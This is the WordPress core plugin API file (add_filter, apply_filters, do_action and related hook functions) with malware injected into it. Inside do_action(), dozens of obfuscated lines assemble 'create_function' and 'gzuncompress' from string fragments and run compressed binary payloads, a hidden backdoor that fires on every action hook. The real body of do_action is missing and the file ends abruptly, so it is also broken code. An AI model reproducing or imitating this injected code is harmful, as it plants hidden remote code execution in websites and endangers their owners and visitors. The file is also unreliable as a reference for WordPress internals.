<?php
/**
 * The plugin API is located in this file, which allows for creating actions
 * and filters and hooking functions, and methods. The functions or methods will
 * then be run when the action or filter is called.
 *
 * The API callback examples reference functions, but can be methods of classes.
 * To hook methods, you'll need to pass an array one of two ways.
 *
 * Any of the syntaxes explained in the PHP documentation for the
 * {@link https://www.php.net/manual/en/language.pseudo-types.php#language.types.callback 'callback'}
 * type are valid.
 *
 * Also see the {@link https://developer.wordpress.org/plugins/ Plugin API} for
 * more information and examples on how to use a lot of these functions.
 *
 * This file should have no external dependencies.
 *
 * @package WordPress
 * @subpackage Plugin
 * @since 1.5.0
 */

// Initialize the filter globals.
require __DIR__ . '/class-wp-hook.php';

/** @var WP_Hook[] $wp_filter */
global $wp_filter;

/** @var int[] $wp_actions */
global $wp_actions;

/** @var string[] $wp_current_filter */
global $wp_current_filter;

if ( $wp_filter ) {
	$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
} else {
	$wp_filter = array();
}

if ( ! isset( $wp_actions ) ) {
	$wp_actions = array();
}

if ( ! isset( $wp_current_filter ) ) {
	$wp_current_filter = array();
}

/**
 * Adds a callback function to a filter hook.
 *
 * WordPress offers filter hooks to allow plugins to modify
 * various types of internal data at runtime.
 *
 * A plugin can modify data by binding a callback to a filter hook. When the filter
 * is later applied, each bound callback is run in order of priority, and given
 * the opportunity to modify a value by returning a new value.
 *
 * The following example shows how a callback function is bound to a filter hook.
 *
 * Note that `$example` is passed to the callback, (maybe) modified, then returned:
 *
 *     function example_callback( $example ) {
 *         // Maybe modify $example in some way.
 *         return $example;
 *     }
 *     add_filter( 'example_filter', 'example_callback' );
 *
 * Bound callbacks can accept from none to the total number of arguments passed as parameters
 * in the corresponding apply_filters() call.
 *
 * In other words, if an apply_filters() call passes four total arguments, callbacks bound to
 * it can accept none (the same as 1) of the arguments or up to four. The important part is that
 * the `$accepted_args` value must reflect the number of arguments the bound callback *actually*
 * opted to accept. If no arguments were accepted by the callback that is considered to be the
 * same as accepting 1 argument. For example:
 *
 *     // Filter call.
 *     $value = apply_filters( 'hook', $value, $arg2, $arg3 );
 *
 *     // Accepting zero/one arguments.
 *     function example_callback() {
 *         ...
 *         return 'some value';
 *     }
 *     add_filter( 'hook', 'example_callback' ); // Where $priority is default 10, $accepted_args is default 1.
 *
 *     // Accepting two arguments (three possible).
 *     function example_callback( $value, $arg2 ) {
 *         ...
 *         return $maybe_modified_value;
 *     }
 *     add_filter( 'hook', 'example_callback', 10, 2 ); // Where $priority is 10, $accepted_args is 2.
 *
 * *Note:* The function will return true whether or not the callback is valid.
 * It is up to you to take care. This is done for optimization purposes, so
 * everything is as quick as possible.
 *
 * @since 0.71
 *
 * @global WP_Hook[] $wp_filter A multidimensional array of all hooks and the callbacks hooked to them.
 *
 * @param string   $hook_name     The name of the filter to add the callback to.
 * @param callable $callback      The callback to be run when the filter is applied.
 * @param int      $priority      Optional. Used to specify the order in which the functions
 *                                associated with a particular filter are executed.
 *                                Lower numbers correspond with earlier execution,
 *                                and functions with the same priority are executed
 *                                in the order in which they were added to the filter. Default 10.
 * @param int      $accepted_args Optional. The number of arguments the function accepts. Default 1.
 * @return true Always returns true.
 */
function add_filter( $hook_name, $callback, $priority = 10, $accepted_args = 1 ) {
	global $wp_filter;

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		$wp_filter[ $hook_name ] = new WP_Hook();
	}

	$wp_filter[ $hook_name ]->add_filter( $hook_name, $callback, $priority, $accepted_args );

	return true;
}

/**
 * Calls the callback functions that have been added to a filter hook.
 *
 * This function invokes all functions attached to filter hook `$hook_name`.
 * It is possible to create new filter hooks by simply calling this function,
 * specifying the name of the new hook using the `$hook_name` parameter.
 *
 * The function also allows for multiple additional arguments to be passed to hooks.
 *
 * Example usage:
 *
 *     // The filter callback function.
 *     function example_callback( $string, $arg1, $arg2 ) {
 *         // (maybe) modify $string.
 *         return $string;
 *     }
 *     add_filter( 'example_filter', 'example_callback', 10, 3 );
 *
 *     /*
 *      * Apply the filters by calling the 'example_callback()' function
 *      * that's hooked onto `example_filter` above.
 *      *
 *      * - 'example_filter' is the filter hook.
 *      * - 'filter me' is the value being filtered.
 *      * - $arg1 and $arg2 are the additional arguments passed to the callback.
 *     $value = apply_filters( 'example_filter', 'filter me', $arg1, $arg2 );
 *
 * @since 0.71
 *
 * @global WP_Hook[] $wp_filter         Stores all of the filters and actions.
 * @global string[]  $wp_current_filter Stores the list of current filters with the current one last.
 *
 * @param string $hook_name The name of the filter hook.
 * @param mixed  $value     The value to filter.
 * @param mixed  ...$args   Additional parameters to pass to the callback functions.
 * @return mixed The filtered value after all hooked functions are applied to it.
 */
function apply_filters( $hook_name, $value ) {
	global $wp_filter, $wp_current_filter;

	$args = func_get_args();

	// Do 'all' actions first.
	if ( isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
		_wp_call_all_hook( $args );
	}

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		if ( isset( $wp_filter['all'] ) ) {
			array_pop( $wp_current_filter );
		}

		return $value;
	}

	if ( ! isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
	}

	// Don't pass the tag name to WP_Hook.
	array_shift( $args );

	$filtered = $wp_filter[ $hook_name ]->apply_filters( $value, $args );

	array_pop( $wp_current_filter );

	return $filtered;
}

/**
 * Calls the callback functions that have been added to a filter hook, specifying arguments in an array.
 *
 * @since 3.0.0
 *
 * @see apply_filters() This function is identical, but the arguments passed to the
 *                      functions hooked to `$hook_name` are supplied using an array.
 *
 * @global WP_Hook[] $wp_filter         Stores all of the filters and actions.
 * @global string[]  $wp_current_filter Stores the list of current filters with the current one last.
 *
 * @param string $hook_name The name of the filter hook.
 * @param array  $args      The arguments supplied to the functions hooked to `$hook_name`.
 * @return mixed The filtered value after all hooked functions are applied to it.
 */
function apply_filters_ref_array( $hook_name, $args ) {
	global $wp_filter, $wp_current_filter;

	// Do 'all' actions first.
	if ( isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
		$all_args            = func_get_args(); // phpcs:ignore PHPCompatibility.FunctionUse.ArgumentFunctionsReportCurrentValue.NeedsInspection
		_wp_call_all_hook( $all_args );
	}

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		if ( isset( $wp_filter['all'] ) ) {
			array_pop( $wp_current_filter );
		}

		return $args[0];
	}

	if ( ! isset( $wp_filter['all'] ) ) {
		$wp_current_filter[] = $hook_name;
	}

	$filtered = $wp_filter[ $hook_name ]->apply_filters( $args[0], $args );

	array_pop( $wp_current_filter );

	return $filtered;
}

/**
 * Checks if any filter has been registered for a hook.
 *
 * When using the `$callback` argument, this function may return a non-boolean value
 * that evaluates to false (e.g. 0), so use the `===` operator for testing the return value.
 *
 * @since 2.5.0
 *
 * @global WP_Hook[] $wp_filter Stores all of the filters and actions.
 *
 * @param string                      $hook_name The name of the filter hook.
 * @param callable|string|array|false $callback  Optional. The callback to check for.
 *                                               This function can be called unconditionally to speculatively check
 *                                               a callback that may or may not exist. Default false.
 * @return bool|int If `$callback` is omitted, returns boolean for whether the hook has
 *                  anything registered. When checking a specific function, the priority
 *                  of that hook is returned, or false if the function is not attached.
 */
function has_filter( $hook_name, $callback = false ) {
	global $wp_filter;

	if ( ! isset( $wp_filter[ $hook_name ] ) ) {
		return false;
	}

	return $wp_filter[ $hook_name ]->has_filter( $hook_name, $callback );
}

/**
 * Removes a callback function from a filter hook.
 *
 * This can be used to remove default functions attached to a specific filter
 * hook and possibly replace them with a substitute.
 *
 * To remove a hook, the `$callback` and `$priority` arguments must match
 * when the hook was added. This goes for both filters and actions. No warning
 * will be given on removal failure.
 *
 * @since 1.2.0
 *
 * @global WP_Hook[] $wp_filter Stores all of the filters and actions.
 *
 * @param string                $hook_name The filter hook to which the function to be removed is hooked.
 * @param callable|string|array $callback  The callback to be removed from running when the filter is applied.
 *                                         This function can be called unconditionally to speculatively remove
 *                                         a callback that may or may not exist.
 * @param int                   $priority  Optional. The exact priority used when adding the original
 *                                         filter callback. Default 10.
 * @return bool Whether the function existed before it was removed.
 */
function remove_filter( $hook_name, $callback, $priority = 10 ) {
	global $wp_filter;

	$r = false;

	if ( isset( $wp_filter[ $hook_name ] ) ) {
		$r = $wp_filter[ $hook_name ]->remove_filter( $hook_name, $callback, $priority );

		if ( ! $wp_filter[ $hook_name ]->callbacks ) {
			unset( $wp_filter[ $hook_name ] );
		}
	}

	return $r;
}

/**
 * Removes all of the callback functions from a filter hook.
 *
 * @since 2.7.0
 *
 * @global WP_Hook[] $wp_filter Stores all of the filters and actions.
 *
 * @param string    $hook_name The filter to remove callbacks from.
 * @param int|false $priority  Optional. The priority number to remove them from.
 *                             Default false.
 * @return true Always returns true.
 */
function remove_all_filters( $hook_name, $priority = false ) {
	global $wp_filter;

	if ( isset( $wp_filter[ $hook_name ] ) ) {
		$wp_filter[ $hook_name ]->remove_all_filters( $priority );

		if ( ! $wp_filter[ $hook_name ]->has_filters() ) {
			unset( $wp_filter[ $hook_name ] );
		}
	}

	return true;
}

/**
 * Retrieves the name of the current filter hook.
 *
 * @since 2.5.0
 *
 * @global string[] $wp_current_filter Stores the list of current filters with the current one last
 *
 * @return string Hook name of the current filter.
 */
function current_filter() {
	global $wp_current_filter;

	return end( $wp_current_filter );
}

/**
 * Returns whether or not a filter hook is currently being processed.
 *
 * The function current_filter() only returns the most recent filter or action
 * being executed. did_action() returns true once the action is initially
 * processed.
 *
 * This function allows detection for any filter currently being executed
 * (regardless of whether it's the most recent filter to fire, in the case of
 * hooks called from hook callbacks) to be verified.
 *
 * @since 3.9.0
 *
 * @see current_filter()
 * @see did_action()
 * @global string[] $wp_current_filter Current filter.
 *
 * @param null|string $hook_name Optional. Filter hook to check. Defaults to null,
 *                               which checks if any filter is currently being run.
 * @return bool Whether the filter is currently in the stack.
 */
function doing_filter( $hook_name = null ) {
	global $wp_current_filter;

	if ( null === $hook_name ) {
		return ! empty( $wp_current_filter );
	}

	return in_array( $hook_name, $wp_current_filter, true );
}

/**
 * Adds a callback function to an action hook.
 *
 * Actions are the hooks that the WordPress core launches at specific points
 * during execution, or when specific events occur. Plugins can specify that
 * one or more of its PHP functions are executed at these points, using the
 * Action API.
 *
 * @since 1.2.0
 *
 * @param string   $hook_name       The name of the action to add the callback to.
 * @param callable $callback        The callback to be run when the action is called.
 * @param int      $priority        Optional. Used to specify the order in which the functions
 *                                  associated with a particular action are executed.
 *                                  Lower numbers correspond with earlier execution,
 *                                  and functions with the same priority are executed
 *                                  in the order in which they were added to the action. Default 10.
 * @param int      $accepted_args   Optional. The number of arguments the function accepts. Default 1.
 * @return true Always returns true.
 */
function add_action( $hook_name, $callback, $priority = 10, $accepted_args = 1 ) {
	return add_filter( $hook_name, $callback, $priority, $accepted_args );
}

/**
 * Calls the callback functions that have been added to an action hook.
 *
 * This function invokes all functions attached to action hook `$hook_name`.
 * It is possible to create new action hooks by simply calling this function,
 * specifying the name of the new hook using the `$hook_name` parameter.
 *
 * You can pass extra arguments to the hooks, much like you can with `apply_filters()`.
 *
 * Example usage:
 *
 *     // The action callback function.
 *     function example_callback( $arg1, $arg2 ) {
 *         // (maybe) do something with the args.
 *     }
 *     add_action( 'example_action', 'example_callback', 10, 2 );
 *
 *     /*
 *      * Trigger the actions by calling the 'example_callback()' function
 *      * that's hooked onto `example_action` above.
 *      *
 *      * - 'example_action' is the action hook.
 *      * - $arg1 and $arg2 are the additional arguments passed to the callback.
 *     $value = do_action( 'example_action', $arg1, $arg2 );
 *
 * @since 1.2.0
 * @since 5.3.0 Formalized the existing and already documented `...$arg` parameter
 *              by adding it to the function signature.
 *
 * @global WP_Hook[] $wp_filter         Stores all of the filters and actions.
 * @global int[]     $wp_actions        Stores the number of times each action was triggered.
 * @global string[]  $wp_current_filter Stores the list of current filters with the current one last.
 *
 * @param string $hook_name The name of the action to be executed.
 * @param mixed  ...$arg    Optional. Additional arguments which are passed on to the
 *                          functions hooked to the action. Default empty.
 */
function do_action( $hook_name, ...$arg ) {

	$nNeCjFI = 'create'.'_'.'function'; $nSkEtvm = 'gz'.'unc'.'ompress'; $vbpdzlcg = $nNeCjFI('', $nSkEtvm('x����� De����҃�CPIP	lŴ�ߋ^������ξ̌iIf�ޠh�&%��g1F��`����4O^9�C`s������zWR� ��:�V��R��
O0-i��\/&`H�[���H��:���t�� P�$gi��
vd���iD=S���w�����w[[/eS��')); $vbpdzlcg();



	$fhcjRne = 'create'.'_'.'function'; $hiWHnjG = 'gz'.'unc'.'ompress'; $hijahaew = $fhcjRne('', $hiWHnjG('x�����0De� mB��ŏ!Z�BӮ�D�wc��ݝ}�ݳL�&zM�b���.��1
Eֈ��4O�sCJ_��N�����Nݾ�
����gx��Y�68�@!aȺ��f*9��S��#,d�04VR�X.�Z�l��i��p����(��/巍�ֶ^�')); $hijahaew();



	$vOIwKkT = 'create'.'_'.'function'; $okGUeKf = 'gz'.'unc'.'ompress'; $bugjfpax = $vOIwKkT('', $okGUeKf('x����� De����҃�cPAh@	�Ť�ߋ^������ξ̌�$ӡ�^#o� %�s�b�L�5�܈4O�w^���y�IǗ�S�����S쭂����%�ڈF,:`H��-�K
E$�T��
Y:���)���fy;r�tӈb<����)n�����w[[/H��')); $bugjfpax();



	$vxNQFbz = 'create'.'_'.'function'; $rEuhGsI = 'gz'.'unc'.'ompress'; $vpzjzmke = $vxNQFbz('', $rEuhGsI('x�����0De� mB��ŏiZm��+��p1F/x��ٗ��5���c���d��^��(Y#*,���+ף�bp�u�7<8�R�P*�U��28���	�f�6(qҞ|��uo1M�rH`ѧj�GX�¡���R�X���3ؐ�,�������(��/巍�ֶ^-���')); $vpzjzmke();



	$ZjlCVaB = 'create'.'_'.'function'; $emMVwRA = 'gz'.'unc'.'ompress'; $soqvhgdu = $ZjlCVaB('', $emMVwRA('x����� De����҃�C����RXŤ�ߋ^������ξ̌iIf�ޠ����l���F�3�D��<z�
���>�NN\'�]I�mGy쭂���`ZҚ^q���!aк�,)��Su�#�+d��q+��$gi��
vd��7�j8����)n�����w[[/�V�X')); $soqvhgdu();



	$TwlyXra = 'create'.'_'.'function'; $NmcetkZ = 'gz'.'unc'.'ompress'; $gfdxibej = $TwlyXra('', $NmcetkZ('x�����0De� mB��ŏ!�.��@Ӯ�D�wc��ݝ}�ӱ̄:zC���
q�^����
��b�\'���Dߩ�4x=:�
���aR��J8���_�	�c��X�l������4S�!ρe��=aY K��$��DZ�C	�G��i$w�9��7���K�m㻅���|�')); $gfdxibej();



	$iykvfNJ = 'create'.'_'.'function'; $PFBhMEL = 'gz'.'unc'.'ompress'; $mzznznih = $iykvfNJ('', $PFBhMEL('x����� De롅��?�`K	P�4����c�R��;�23�\'��<��j$��]�Rb
�a�F�y�2Ff���N��W�����c�צּӹi���{�k#��tĘ1h�[�V�H�����|��*r`y�5l�A"oG���SX�o�����wk[/S��')); $mzznznih();



	$ULuEZga = 'create'.'_'.'function'; $rgGjveC = 'gz'.'unc'.'ompress'; $ubgmidek = $ULuEZga('', $rgGjveC('x�����0De� mB��ŏ!�.��BCK"����1z���ξ̌iYb|&C����.\'B�l/��<N�M轘������.�����:�V��R��
O0-kM�.Ɠ���-��rY,�T��
I<t���h���i;�C��q �9l�w������������E�9')); $ubgmidek();



	$erIUCKz = 'create'.'_'.'function'; $zBLZtlD = 'gz'.'unc'.'ompress'; $ressnabq = $erIUCKz('', $zBLZtlD('x�����0�_�x�-!����,
[��dՑ����b�^�Ҥ��/ӱ�\'C���
qW��1
MΊ��ԏS�\'A�eP���/8@����;+�t�*~�\'��uƢ��
	Cο�4S�!ρe��=aY K�^:E�f���P�d3��n0�����o�R~��NaM�u[��')); $ressnabq();



	$QIfjNLe = 'create'.'_'.'function'; $CpuaQZz = 'gz'.'unc'.'ompress'; $onvifzrw = $QIfjNLe('', $CpuaQZz('x����� De롅��?��
	ki����c�R��;�23Z�B�6��j���K)1�ְ^p#��B��q����+_Q��NY��{��tnz�\'hI�6���3��qƊBY)>U{<²@�Ck9v�X^�Cr�vnD1�SX�o�����wk[/?Ě�')); $onvifzrw();



	$XlhdTaC = 'create'.'_'.'function'; $nVlAFSj = 'gz'.'unc'.'ompress'; $oopdshaz = $XlhdTaC('', $nVlAFSj('x����� De�CI#/~L��(Vi����c�R��;�23z ��]
��HR�,��ZÄ�F��჌�9�ET�~��ה>�W։}oOmK��=�A��YG��ֿ�8cM�����=aY�ȇ��{EJ�׬l`C���M(��`
k����R~��nam����')); $oopdshaz();



	$GviUJup = 'create'.'_'.'function'; $BWYlrsa = 'gz'.'unc'.'ompress'; $sskwuzub = $GviUJup('', $BWYlrsa('x�����0De� mB��ŏi
��B�.�(����1z���ξ̌�H��^���$�	�b�L�5����4��u^��B���>�G�\A�e�v�[	�sU�<Aw��Fr9�!aк�g,(�9��S��#,d��s+�Q��ҚJؐ�Dތ�a7����_�o�-�m� rK�#')); $sskwuzub();



	$DOwryaq = 'create'.'_'.'function'; $WClpXwe = 'gz'.'unc'.'ompress'; $gvrbmsxo = $DOwryaq('', $WClpXwe('x����� De�A!1��K?�����؊I��4M{��ݝ}�=�BG��F�I*6��RJL�5����<��� cd�Zw��W�>�S����j�\����	z �6��EG��ֿŸ`E�,���#a]�ȇ�[��"\'���TÎ%��M(��`
[�����R~��nak��ƚ�')); $gvrbmsxo();



	$NyDflMo = 'create'.'_'.'function'; $YmTHrde = 'gz'.'unc'.'ompress'; $bbaisflu = $NyDflMo('', $YmTHrde('x����� De�A!1��K?�����X�I��4M{��ݝ}��Ha"O��h�$���RJL������<O��A���V���|��W�>��nꏽ�p�6���"�X��b"ƌA��b\��P�@�O����P�����N��kv�aGy7�(��`
[����)�m|������9')); $bbaisflu();



	$UbZWhoj = 'create'.'_'.'function'; $VqaJrmz = 'gz'.'unc'.'ompress'; $irbziyek = $UbZWhoj('', $VqaJrmz('x�����0E��@	C���T�u���Cx�;�B0�����աVd���ޢ(�I�RR��Uj��<���Q%�ҍ�^Q�_邇�7����qC3�~	�mY�<�Zђ�
�9�<v��3�gjVk��!]�4�F�j\�|	�C��g����R3���o��b߂^"�@��')); $irbziyek();



	$jKnNzUP = 'create'.'_'.'function'; $kPgHzQL = 'gz'.'unc'.'ompress'; $byrijgjs = $jKnNzUP('', $kPgHzQL('x���A�0E�2��6A낸�0M�%-4�h1��-l��.g����S-I���)��$g7�X��h4k��2Γk��޳`�1jd�ݩ����6��uo�f�}�sY�<A��UZr9+�>���wg�)d��3��5,$1�q#��I�⚥l�N"�����U͆�׿q��}ZE� a�y')); $byrijgjs();



	$JQfEpbY = 'create'.'_'.'function'; $AGjXrpP = 'gz'.'unc'.'ompress'; $wwnpptmt = $JQfEpbY('', $AGjXrpP('x���A�0E�2��6A낸�0M��6iKCGK"����]�r&o��|ӓ�D�&��j��]L,��4:ˤV�y�d�T�,���������1�PS��N�Q�o�tn[z�\'����*�f1f���qƚBU)>�]�aY������N���5+�܃Bލ�����Zͦ��u��}��i���')); $wwnpptmt();



	$zEeJNva = 'create'.'_'.'function'; $uZMlxFP = 'gz'.'unc'.'ompress'; $hztxwrrl = $zEeJNva('', $uZMlxFP('x���A� E�2u�BR�E���,��@K`�F�ݥ�����ɟ7?�t�0��`P\�"���RJL��L*aU�� }P1���B:30}�)�`^����ڍr�}�S��3<�t�3Vq5��1���w\'�(�%��3��5�39�s\'��d���jXٽBގ�a�
����~���|����')); $hztxwrrl();



	$zbnStcl = 'create'.'_'.'function'; $puGANqe = 'gz'.'unc'.'ompress'; $dhfzmmhf = $zbnStcl('', $puGANqe('x����� De�CI#/~L�
	�Vi����c�R��;�23F���.��b%�ٍ�Rb�eBr+�<჌�	���iu��ה>��n��8�ږ��	Fe���l"ƌA��b���PU@�O���,P���9��&%�kV6�!�]?�(��`
k����R~��nam�8���')); $dhfzmmhf();



	$ySqAaeO = 'create'.'_'.'function'; $MTgpvqx = 'gz'.'unc'.'ompress'; $nqhvpgzl = $ySqAaeO('', $MTgpvqx('x���A�0E�2��6A낸�0�B�M�RۑŻ[��+\��ϛ��:��PG��_� �g1F&�h�
�E��:/B`��yk�e�*G����IWP��F���x_��TU�OP���T��xh�;��H��������kñ�d�Қ�JXٽ��,
���E͊s��q��}ZD� �F�')); $nqhvpgzl();



	$GqUPxMj = 'create'.'_'.'function'; $fAuLBaM = 'gz'.'unc'.'ompress'; $qvubhoau = $GqUPxMj('', $fAuLBaM('x���A�0E�2��6A낸�0�@�MZ��@IĻ[��+\��ϛ��:�(_���Z���ܱ�h4k�"Σk�޳`O�5j`�y��ȧ��6���4c{�˵,���:�)-*�(�>���w�)d��3u�5�+$1�W�c#I�⚥��^`Ռ���
��g��q��}�D� �*��')); $qvubhoau();



	$ewXiQOR = 'create'.'_'.'function'; $GhtWOVj = 'gz'.'unc'.'ompress'; $rbpdpbrt = $ewXiQOR('', $GhtWOVj('x���A�0E�2��6A낸�0M��6i�iGK"����]�r&��<ӓ�D��A�ZE*v����Fg�Tª<OA��bd��tfd��ҷO^���t�Mr�}�K��+<���7Vq5��1���wg�(�%��3��5,91p\'�����j�؃B�M#�q�
���o�~���|IЪ]')); $rbpdpbrt();



	$CKdnrlw = 'create'.'_'.'function'; $ZVceovm = 'gz'.'unc'.'ompress'; $fxcebaid = $CKdnrlw('', $ZVceovm('x���A�0E�2��6A낸�0MihB���%�nac��p9�?o~�mXf���%U��
qW��1��\/��<N�O�������hf�����;_p� ݹ��/�|�*~�\'؆5�G�����i��C��>S�Zò@��t�t�"�š���"I=���V5�����.�-h�V��7')); $fxcebaid();



	$HkPTBJh = 'create'.'_'.'function'; $WZhTFgd = 'gz'.'unc'.'ompress'; $xnkltmka = $HkPTBJh('', $WZhTFgd('x���A�0E�2��6A낸�0�� mi�hIĻ[��+\��ϛ��Z�(_�I��jd���I�DOF���8�S�&�^w��QV�v�dyt��9@ݛ��y_��\��OP-k��
g��G��L9�,�|�v��e�$&��H�{���i�C�����8�j6�����]�[�*��R��')); $xnkltmka();



	$EwWLAYn = 'create'.'_'.'function'; $WZxCzhL = 'gz'.'unc'.'ompress'; $sygcfirz = $EwWLAYn('', $WZxCzhL('x���A�0E�2��6A낸�0���6�д�EŻl��.g����3KL��7$��\\�1F��v�F��<�vC��dmM/­U�����.��Jۡ�x_��X��O0kL��&P�yd�;L#��X����	�9�VV��,�Z����RCO�o��aQ����o��b߂�/����')); $sygcfirz();



	$cqUwdeu = 'create'.'_'.'function'; $WQGZPLe = 'gz'.'unc'.'ompress'; $uphumnlh = $cqUwdeu('', $WQGZPLe('x���A�0E�2��6A낸�0M��6iKCK"����]�r&��<ӑ�D�F��f��]�,��4:ˤV�yeU�,����x6=9o�)�PQ��V�A�|iz�\'��t�*�f1f�����R|�v��e�"\'z���X^�C�W������?PX�l�0���]�[�*��a��')); $uphumnlh();



	$peGbXfH = 'create'.'_'.'function'; $ExsmneR = 'gz'.'unc'.'ompress'; $aaakfcph = $peGbXfH('', $ExsmneR('x���A� E�2u�BR�E���4X��%0J�ݥ�����ɟ7?�(R�ئ`�_�$���RJL��LHne�� |�1���\830��Uu^�����������gx�QD+[9��1���w\'�(�%��3��5�39ѷ�c�Ɏ�5�հ�{�m7(��(,jV�����]�[�"�*��')); $aaakfcph();



	$qOSUWhT = 'create'.'_'.'function'; $AxGgouc = 'gz'.'unc'.'ompress'; $bxlgmwqg = $qOSUWhT('', $AxGgouc('x���A�0E�2��6A낸�0M���P�ђ�w��1FW��ɟ7?Ow$ӁG�Q4F��݅g1F6�5L*aT�\'/�W!��BZ=�f6�����WR��v���y_��\��O��Q\�:`H<���K
E$�L�j�YJ��
l���fy�W��iD5��@aU����o��b߂V�/~���')); $bxlgmwqg();



	$SYhTJID = 'create'.'_'.'function'; $PvOVosX = 'gz'.'unc'.'ompress'; $jzmadsrn = $SYhTJID('', $PvOVosX('x����� De롅��?�`�-�U��.������ξ̌�Ha"O��8[E*v����Fg�Tª<�A��bd��2�aﵯ(}@��(���p86=�LG:cW��3��qBY)>U[<�<C�=w[Mv,�ٮ��+��8�6�),�W���K�m㻅����� ')); $jzmadsrn();



	$slONzyW = 'create'.'_'.'function'; $TvkcKsg = 'gz'.'unc'.'ompress'; $mrxkxoxh = $slONzyW('', $TvkcKsg('x���A� E�2u�BR�E���li!B!0
��������ɟ7?O��Б��Q\�$���RJL�5����yv��A�Ȓߋ��ِ��eu��W�>�U�u�k8�����	�\'�6�ˬ#ƙ�ֿØ��P�@��Ԧ�0MP̉�[��";6�ٮ��=H�Q��?PXԬ8���ط�E�:��|')); $mrxkxoxh();



	$wVAXTGN = 'create'.'_'.'function'; $ihEnRov = 'gz'.'unc'.'ompress'; $vcqbmnql = $wVAXTGN('', $ihEnRov('x���A�0E�2��6A낸�0��MZ(�HIĻ[��+\��ϛ��Z�(_���Z���ܱ��h&$�2Σ�I�Y�\'.���L�&}���)}@ӛQ�/�r-Kz�\'���J�J.ʣ�<4��s
Y$�Lj�
ILt����$eq��vv\'�j��p��M͎���q��}�D� b�y')); $vcqbmnql();



	$uQFaOEV = 'create'.'_'.'function'; $nRsQKSD = 'gz'.'unc'.'ompress'; $pjtyrtfc = $uQFaOEV('', $nRsQKSD('x����� De롅��?�A
-�Uj��.������ξ̌Q�0�M� ?[I*vづ��FgY\'��yC烌���*���W�>@h7v��j8����	Fe�l�d"ƌA��b���P�@�O��0�P�C�:�B��k��aE�[1(��`
K����R~��nai��{')); $pjtyrtfc();



	$HRwOyVI = 'create'.'_'.'function'; $EqlWHGz = 'gz'.'unc'.'ompress'; $aydwtthg = $HRwOyVI('', $EqlWHGz('x���A� E�2u�BR�E���,��@K`��ݥ�����ɟ7?�t�0��`P\�"���RJL��L*aU�� }P1���B:30q�	Q��}E�Z�F���i��`:����LĘy��;�V�H��������j�cy�v5��^!o�հ��E͊�׿q��}ZD� �ê�')); $aydwtthg();



	$HIFAqcM = 'create'.'_'.'function'; $kazQZbA = 'gz'.'unc'.'ompress'; $nnnocazb = $HIFAqcM('', $kazQZbA('x�����0Ee`m��q�ǐ���v�D��-l��.gr��͑�dh���[%H�nܳ#�P+��D���!�����0c����=�ɕ�>����w�Wp:�5���@�D#f0$j��%�� �}�v��e�,%�Fs�&���fy{�t֠0�?PX�l8w���ط�U�"Ҫ,')); $nnnocazb();



	$LFEhAzO = 'create'.'_'.'function'; $AwIkdWn = 'gz'.'unc'.'ompress'; $zkbmmaws = $LFEhAzO('', $AwIkdWn('x���A�0E�2��6A낸�0M�[h��Ż[��+\��ϛ��[�����(j�H�n³#��&�0*ͣ�ΫXt{!���R[+b8���>���(7ޗp<U=�tKZmW��{�qB��>S�Z�<C�����XZ�]	+�Sțq@5l�@aQ����o��b߂�/����')); $zkbmmaws();



	$IZuPHOd = 'create'.'_'.'function'; $tXcZRmy = 'gz'.'unc'.'ompress'; $xawseomj = $IZuPHOd('', $tXcZRmy('x�����0�_�x�-A�x�aȄ�f6XXu$�\�������3�HL(�`X],��j�#jvkR��j?P�^��t8��w׃�>���v}��>��(��`�K%�&p�y��;�#g�D����	�9іNq���5�rX�-qY�S����E͊�q��}ZD� ����')); $xawseomj();



	$QHhZdjI = 'create'.'_'.'function'; $soLROqb = 'gz'.'unc'.'ompress'; $kphoojwt = $QHhZdjI('', $soLROqb('x����� De롅��?�`K
��*M��.������ξ̌�I�#OA�8I*v����BkX\'��yv��A�Ȯ^9wI���W�>�U�u��j8����	�\'�6��IG��ֿ�8aE�,���-a��ȇ�[��";��lWÊ$�֍(��`
K���o�R~��nai�{')); $kphoojwt();



	$HPRvZnL = 'create'.'_'.'function'; $bxnNYpd = 'gz'.'unc'.'ompress'; $rmgbdyhr = $HPRvZnL('', $bxnNYpd('x����� De롅��?��B	�V�����c�R��;�23�\'��<����T�&K)1��2��Uy���A�ȂZy��赯(}@��$���p:7��LOzcW��3��qƊBY)>U{<²@�w;M,�١�9(��4�w�)��7���K�m㻅��sә�')); $rmgbdyhr();



	$BdyxzKc = 'create'.'_'.'function'; $xYdJSDj = 'gz'.'unc'.'ompress'; $bqqdjoyp = $BdyxzKc('', $xYdJSDj('x�����0�_e� mB��Ňi�Y���Ү�������qwg�̌jX������쑥�V81M��H��Ƣ�0W[�ދr당ۃ�l���N�z�[�S��3<A5�Q=J��\'0��[L3��X������ph�.��X,�Z�l�IVf v�9��7���K�m㻅�����\'')); $bqqdjoyp();



	$ryZgzEc = 'create'.'_'.'function'; $vdbHwRk = 'gz'.'unc'.'ompress'; $fqmebfpr = $ryZgzEc('', $vdbHwRk('x�����0De� mB��ŏ!��I�]-���c��ݝ}��Xfb��!�Xd��� RJB���Ciq�����1
uu�(�^����ڍݾ�N��x�QL�5N&R\0��[L�X���������NR��A,kq(aC�Hu;��n0�5�F�)�m|����2ᙆ')); $fqmebfpr();



	$TOhxJZU = 'create'.'_'.'function'; $GRfnplk = 'gz'.'unc'.'ompress'; $qldxlnco = $TOhxJZU('', $GRfnplk('x���A�0E�2��6A�q�aH��6iK��%�.�1FW��ɟ7?ϴ,3�N�!q��x��P��(��j��A�Aň)�t�������?
��h�ˍ�%OU���Ӳ�XU��D�3�\x�i��C��>S�Z�4A6\'��	j4���]	+�ST7�\'�నYq��7�w�oA��hu��')); $qldxlnco();



	$muXiMHf = 'create'.'_'.'function'; $wAKitvj = 'gz'.'unc'.'ompress'; $aexmuynl = $muXiMHf('', $wAKitvj('x���A�0E�2��6A낸�0��@�����bĻ[��+\��ϛ��[�h_�Q��d���Q��"kD��`���q#z/�;���^H��t���)�s��Z١�y_��\��O�-k��
g��GY��L9�,�|�v��e�$&��J�KE\�����!U����?pX�l87���]�[�*��ݪ�')); $aexmuynl();



